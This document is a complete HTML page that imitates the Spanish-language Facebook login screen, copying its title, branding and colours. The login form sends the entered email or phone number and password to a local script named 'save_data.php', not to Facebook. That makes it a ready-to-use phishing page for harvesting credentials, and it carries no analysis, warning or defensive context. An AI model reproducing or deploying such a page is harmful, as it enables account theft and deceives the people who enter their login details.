<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Inicia sesión o regístrate</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f2f5; }
        .login-box { 
            width: 400px; margin: 100px auto; padding: 20px; 
            background: white; box-shadow: 0 0 10px rgba(0,0,0,0.1); 
            text-align: center; 
        }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; }
        button { background: #1877f2; color: white; border: none; padding: 12px; width: 100%; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2 style="color: #1877f2;">Facebook</h2>
        <form action="save_data.php" method="POST">
            <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
        <p><a href="#">¿Olvidaste tu contraseña?</a></p>
    </div>
</body>
</html>
